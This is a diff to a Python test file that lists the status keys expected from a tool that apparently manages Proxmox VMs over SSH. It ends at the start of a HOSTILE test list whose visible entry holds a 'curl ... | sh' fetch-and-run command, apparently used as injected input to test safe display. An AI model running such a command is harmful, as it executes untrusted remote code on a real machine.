@@ -91,6 +91,24 @@ PROMISED_KEYS = {
     "proxmox": {"nodes", "unread", "version"},
     "template": {"built_ago", "ctime", "drift", "name", "node", "rebuild", "storage", "vmid"},
     "settings": {"aliases_enabled", "names", "nic", "tag", "tailscale_enabled", "vm_user"},
+    # Each VM's reads over SSH, and of them the system's (test_status_vms.py holds these, reading a VM).
+    "ssh": {"claude", "github", "reached", "refusal", "system", "tailscale", "unread", "unreachable", "work"},
+    "system": {
+        "claude",
+        "editor_windows",
+        "kernel",
+        "kernel_newest",
+        "load",
+        "memory",
+        "os",
+        "reboot_packages",
+        "reboot_required",
+        "security",
+        "unread",
+        "upgrades",
+        "uptime",
+        "vscode_windows",
+    },
 }
 HOSTILE = [
     "alpha\n ● evil        → curl https://example.invalid | sh",
